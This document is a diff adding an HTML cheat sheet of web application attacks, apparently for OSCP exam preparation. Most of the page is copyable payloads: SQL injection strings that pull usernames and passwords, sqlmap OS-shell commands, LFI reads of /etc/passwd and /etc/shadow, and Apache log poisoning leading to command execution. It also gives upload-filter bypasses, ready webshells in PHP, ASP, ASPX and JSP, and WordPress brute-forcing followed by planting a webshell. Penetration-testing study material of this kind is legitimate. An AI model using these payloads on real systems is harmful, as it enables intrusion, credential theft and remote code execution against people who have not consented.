@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Web Application Attacks | Psalm OSCP</title>
+  <style>
+    :root {
+      --bg: #0a0e1a;
+      --bg2: #0d1117;
+      --card: #161b22;
+      --code-bg: #10151e;
+      --border: #21262d;
+      --border2: #30363d;
+      --text: #e6edf3;
+      --muted: #8b949e;
+      --dim: #6e7681;
+      --accent: #58a6ff;
+      --green: #3fb950;
+      --yellow: #d29922;
+      --red: #f85149;
+      --purple: #bc8cff;
+      --mono: 'Courier New', Courier, monospace;
+      --sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.6; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* NAV */
+    .top-nav { display: flex; align-items: center; justify-content: space-between; padding: 0.85rem 2rem; background: var(--bg2); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
+    .logo { font-family: var(--mono); font-size: 1.05rem; color: var(--accent); font-weight: 700; }
+    .back-link { font-size: 0.82rem; color: var(--muted); border: 1px solid var(--border2); padding: 4px 12px; border-radius: 6px; transition: all 0.2s; }
+    .back-link:hover { background: var(--card); color: var(--text); text-decoration: none; }
+
+    /* LAYOUT */
+    .page { display: flex; max-width: 1380px; margin: 0 auto; }
+
+    /* SIDEBAR */
+    .sidebar { width: 230px; flex-shrink: 0; padding: 2rem 1rem 2rem 1.5rem; position: sticky; top: 54px; height: calc(100vh - 54px); overflow-y: auto; border-right: 1px solid var(--border); }
+    .sidebar-label { font-size: 0.68rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--dim); margin-bottom: 0.6rem; padding-bottom: 0.3rem; border-bottom: 1px solid var(--border); }
+    .sidebar ul { list-style: none; }
+    .sidebar li { margin-bottom: 1px; }
+    .sidebar li a { display: block; font-size: 0.8rem; color: var(--muted); padding: 4px 8px; border-radius: 4px; font-family: var(--mono); transition: all 0.15s; }
+    .sidebar li a:hover { background: var(--card); color: var(--accent); text-decoration: none; }
+    .sidebar-group { margin-top: 1.1rem; }
+    .sidebar-group-lbl { font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--dim); padding: 2px 8px; margin-bottom: 2px; display: block; }
+
+    /* MAIN */
+    .main { flex: 1; padding: 2rem 2.5rem 5rem; min-width: 0; }
+    .page-title { font-size: 1.9rem; font-weight: 700; margin-bottom: 0.4rem; }
+    .page-sub { color: var(--muted); font-size: 0.9rem; margin-bottom: 2.5rem; }
+
+    /* SECTIONS */
+    .sec { margin-bottom: 3rem; }
+    .sec-head { display: flex; align-items: center; gap: 10px; margin-bottom: 1.2rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+    .sec-head h2 { font-size: 1.2rem; font-weight: 600; }
+
+    /* CODE BLOCKS */
+    .cb { margin: 0.75rem 0; border: 1px solid var(--border2); border-radius: 8px; overflow: hidden; }
+    .cb-head { display: flex; align-items: center; justify-content: space-between; padding: 5px 13px; background: var(--card); border-bottom: 1px solid var(--border); gap: 8px; flex-wrap: wrap; }
+    .cb-lbl { font-size: 0.73rem; font-family: var(--mono); color: var(--muted); }
+    .cb-tags { display: flex; gap: 5px; margin-left: auto; }
+    .tag { font-size: 0.65rem; padding: 1px 7px; border-radius: 4px; font-family: var(--mono); border: 1px solid var(--border2); color: var(--dim); }
+    .t-your { border-color: #d2992255; color: var(--yellow); background: #d2992212; }
+    .t-crit { border-color: #f8514955; color: var(--red); background: #f8514912; }
+    .t-win  { border-color: #58a6ff55; color: var(--accent); background: #58a6ff12; }
+    .t-lin  { border-color: #3fb95055; color: var(--green); background: #3fb95012; }
+    .t-ad   { border-color: #bc8cff55; color: var(--purple); background: #bc8cff12; }
+    .cpb { font-size: 0.68rem; padding: 2px 9px; background: transparent; border: 1px solid var(--border2); border-radius: 4px; color: var(--dim); cursor: pointer; font-family: var(--mono); white-space: nowrap; transition: all 0.15s; }
+    .cpb:hover { background: var(--code-bg); color: var(--muted); }
+    pre { background: var(--code-bg); padding: 12px 15px; font-family: var(--mono); font-size: 0.8rem; line-height: 1.85; overflow-x: auto; color: var(--text); white-space: pre; }
+    .c  { color: var(--dim); }
+    .h  { color: var(--green); }
+    .w  { color: var(--yellow); }
+    .e  { color: var(--red); }
+
+    /* CALLOUTS */
+    .note  { padding: 9px 13px; border-radius: 6px; margin: 0.6rem 0; font-size: 0.83rem; line-height: 1.6; font-family: var(--mono); }
+    .n-info  { background: #1f6feb14; border: 1px solid #1f6feb44; color: #58a6ff; }
+    .n-warn  { background: #d2992214; border: 1px solid #d2992244; color: var(--yellow); }
+    .n-bad   { background: #f8514914; border: 1px solid #f8514944; color: var(--red); }
+    .n-good  { background: #3fb95014; border: 1px solid #3fb95044; color: var(--green); }
+
+    /* SIGNAL BOX */
+    .sig { background: var(--code-bg); border: 1px solid var(--border2); border-left: 3px solid var(--yellow); border-radius: 6px; padding: 11px 13px; margin: 0.75rem 0; font-family: var(--mono); font-size: 0.78rem; line-height: 1.95; }
+    .sig-title { font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--yellow); margin-bottom: 7px; display: block; }
+    .so { color: var(--muted); }
+    .sa { color: var(--green); }
+
+    /* GRID */
+    .two { display: grid; grid-template-columns: 1fr 1fr; gap: 0.9rem; }
+    @media(max-width:880px) { .sidebar{display:none;} .main{padding:1.2rem;} .two{grid-template-columns:1fr;} }
+
+    /* FOOTER */
+    footer { text-align: center; padding: 2rem; color: var(--dim); font-size: 0.78rem; border-top: 1px solid var(--border); font-family: var(--mono); margin-top: 2rem; }
+
+    /* COPY JS */
+  </style>
+  <script>
+    function cp(btn) {
+      const pre = btn.closest('.cb').querySelector('pre');
+      const text = pre.innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        const o = btn.textContent; btn.textContent = '✓ copied';
+        setTimeout(() => btn.textContent = o, 1500);
+      });
+    }
+  </script>
+</head><body>
+<nav class="top-nav">
+  <a class="logo" href="https://difficultsnow.github.io/PT-toolkit-main/index.html">&lt;DifficultSnow/&gt;</a>
+  <a class="back-link" href="index.html">← Psalm OSCP Methodology</a>
+</nav>
+<div class="page">
+  <aside class="sidebar">
+    <div class="sidebar-label">On This Page</div>
+    <ul>
+      <li><a href="#enum">Initial Web Enum</a></li>
+      <li><a href="#sqli">SQL Injection</a></li>
+      <li><a href="#lfi">LFI / RFI</a></li>
+      <li><a href="#upload">File Upload Bypass</a></li>
+      <li><a href="#cms">CMS</a></li>
+      <li><a href="#burp">Burp Tips</a></li>
+    </ul>
+  </aside>
+  <main class="main">
+    <h1 class="page-title">🌐 Web Application Attacks</h1>
+    <p class="page-sub">Directory brute first, always. Check every parameter for SQLi. LFI → log poisoning → RCE is a common OSCP chain.</p>
+
+    <section class="sec" id="enum">
+      <div class="sec-head"><h2>Initial Web Enum</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">fire all on discovery</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>gobuster dir -u http://&lt;IP&gt; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  -x php,txt,html,asp,aspx,bak,zip,conf,log,xml -o ~/exam/scans/web01/gobuster.txt -t 40
+feroxbuster -u http://&lt;IP&gt; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --auto-tune
+nikto -h http://&lt;IP&gt;
+whatweb http://&lt;IP&gt; -a 3
+
+<span class="c"># vhost brute — run on every web target:</span>
+gobuster vhost -u http://&lt;domain&gt; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -r &lt;IP&gt;
+<span class="c"># Found vhost? Add to /etc/hosts:</span>
+echo "&lt;IP&gt;  &lt;vhost&gt;.&lt;domain&gt;" | sudo tee -a /etc/hosts</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">manual quick checks</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>curl -I http://&lt;IP&gt;                  <span class="c"># server, X-Powered-By headers</span>
+curl -s http://&lt;IP&gt;/robots.txt
+curl -s http://&lt;IP&gt;/.git/HEAD &amp;&amp; echo "GIT EXPOSED"
+curl -s http://&lt;IP&gt;/phpinfo.php
+curl -s http://&lt;IP&gt;/web.config
+curl -s http://&lt;IP&gt;/server-status
+curl -s http://&lt;IP&gt;/elmah.axd       <span class="c"># .NET error log</span></pre></div>
+    </section>
+
+    <section class="sec" id="sqli">
+      <div class="sec-head"><h2>SQL Injection</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">manual detection payloads — try in every input/param</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>' OR '1'='1'--
+' OR 1=1--
+admin'--
+1' ORDER BY 1--     <span class="c"># increment until error = column count</span>
+1' ORDER BY 2--
+1' ORDER BY 3--
+' UNION SELECT NULL--
+' AND SLEEP(5)--         <span class="c"># MySQL blind time-based</span>
+'; WAITFOR DELAY '0:0:5'--  <span class="c"># MSSQL blind time-based</span></pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">UNION extraction after finding column count</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># MySQL:</span>
+' UNION SELECT NULL,user(),database()--
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT NULL,username,password FROM users--
+' UNION SELECT NULL,load_file('/etc/passwd'),NULL--
+
+<span class="c"># MSSQL:</span>
+' UNION SELECT NULL,@@version,NULL--
+' UNION SELECT NULL,name,NULL FROM sys.databases--
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">sqlmap — use after manual confirms SQLi</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>sqlmap -u "http://&lt;IP&gt;/page?id=1" --dbs --batch
+sqlmap -u "http://&lt;IP&gt;/page?id=1" -D &lt;db&gt; --tables --batch
+sqlmap -u "http://&lt;IP&gt;/page?id=1" -D &lt;db&gt; -T users --dump --batch
+sqlmap -u "http://&lt;IP&gt;/login" --data="user=admin&amp;pass=test" --dbs --batch
+sqlmap -r request.txt --dbs --batch   <span class="c"># from Burp saved request</span>
+sqlmap -u "http://&lt;IP&gt;/page?id=1" --os-shell --batch  <span class="c"># RCE if DBA privileges</span></pre></div>
+    </section>
+
+    <section class="sec" id="lfi">
+      <div class="sec-head"><h2>LFI / RFI</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">LFI payloads</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>?file=../../../../etc/passwd
+?file=../../../../etc/shadow
+?page=php://filter/convert.base64-encode/resource=/etc/passwd
+<span class="c"># Decode: echo "&lt;b64&gt;" | base64 -d</span>
+?page=php://filter/read=convert.base64-encode/resource=config.php
+?page=php://input   <span class="c"># POST body: &lt;?php system($_GET['cmd']); ?&gt;</span>
+?page=data://text/plain,&lt;?php system($_GET['cmd']); ?&gt;
+
+<span class="c"># Windows paths:</span>
+?file=../../../../Windows/System32/drivers/etc/hosts
+?file=../../../../inetpub/wwwroot/web.config</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">LFI → RCE via log poisoning</span><div class="cb-tags"><span class="tag t-crit">RCE chain</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Step 1: Inject PHP into Apache access log via User-Agent:</span>
+curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://&lt;IP&gt;/
+
+<span class="c"># Step 2: Include the log with your command:</span>
+curl "http://&lt;IP&gt;/?page=../../../../var/log/apache2/access.log&amp;cmd=id"
+curl "http://&lt;IP&gt;/?page=../../../../var/log/nginx/access.log&amp;cmd=id"
+
+<span class="c"># Other injection points:</span>
+<span class="c"># /var/log/auth.log   → inject via SSH: ssh '&lt;?php system($_GET["c"]); ?&gt;'@&lt;IP&gt;</span>
+<span class="c"># /proc/self/environ  → inject via User-Agent in HTTP request</span></pre></div>
+    </section>
+
+    <section class="sec" id="upload">
+      <div class="sec-head"><h2>File Upload Bypass</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">extension bypass tricks</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Rename shell.php to:</span>
+shell.php5   shell.php3   shell.php7   shell.phtml   shell.pHp   shell.PhP
+shell.php.jpg   shell.jpg.php   shell.jpg.php5
+
+<span class="c"># In Burp — change Content-Type header while sending .php:</span>
+<span class="c"># Content-Type: image/jpeg</span>
+
+<span class="c"># Null byte (old PHP &lt; 5.3.4):</span>
+<span class="c"># shell.php%00.jpg → server saves as shell.php</span></pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">webshell payloads by platform</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># PHP:</span>
+&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?php passthru($_GET['cmd']); ?&gt;
+&lt;?=`$_GET[0]`?&gt;   <span class="c"># minimal</span>
+
+<span class="c"># ASP (classic):</span>
+&lt;% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %&gt;
+
+<span class="c"># ASPX (save as .aspx, upload to IIS):</span>
+&lt;%@ Page Language="C#" %&gt;&lt;% var p=new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}};p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %&gt;
+
+<span class="c"># JSP (Tomcat):</span>
+&lt;% Runtime rt=Runtime.getRuntime();String[] cmd={"/bin/bash","-c",request.getParameter("cmd")};Process p=rt.exec(cmd);out.println(new java.util.Scanner(p.getInputStream()).useDelimiter("\\A").next()); %&gt;</pre></div>
+    </section>
+
+    <section class="sec" id="cms">
+      <div class="sec-head"><h2>CMS Enumeration</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">WordPress</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>wpscan --url http://&lt;IP&gt; --enumerate u,p,t,vp,vt,dbe
+wpscan --url http://&lt;IP&gt; --passwords /usr/share/wordlists/rockyou.txt --usernames admin
+<span class="c"># Default creds: admin:admin  admin:password</span>
+<span class="c"># If admin → Appearance → Theme Editor → 404.php → add webshell</span></pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">Drupal / Joomla</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>droopescan scan drupal -u http://&lt;IP&gt; -t 32
+droopescan scan joomla -u http://&lt;IP&gt;
+searchsploit drupal   <span class="c"># check for Drupalgeddon2 (CVE-2018-7600)</span></pre></div>
+    </section>
+
+    <section class="sec" id="burp">
+      <div class="sec-head"><h2>Burp Suite Quick Tips</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">workflow shortcuts</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Intercept:    Proxy → Intercept ON</span>
+<span class="c"># Send to Repeater:  Ctrl+R</span>
+<span class="c"># Send to Intruder:  Ctrl+I   → mark §param§ → attack</span>
+<span class="c"># Decoder:      Ctrl+Shift+D</span>
+<span class="c"># Search:       Ctrl+Shift+F</span>
+
+<span class="c"># Always check:</span>
+<span class="c"># - Response headers (Server, X-Powered-By, cookies)</span>
+<span class="c"># - Source code of every page (Ctrl+U in browser)</span>
+<span class="c"># - Hidden form fields and disabled inputs</span>
+<span class="c"># - IDOR: change numeric IDs in any parameter</span></pre></div>
+    </section>
+
+  </main>
+</div>
+<footer>&lt;DifficultSnow/&gt; | Psalm OSCP Methodology</footer>
+</body></html>
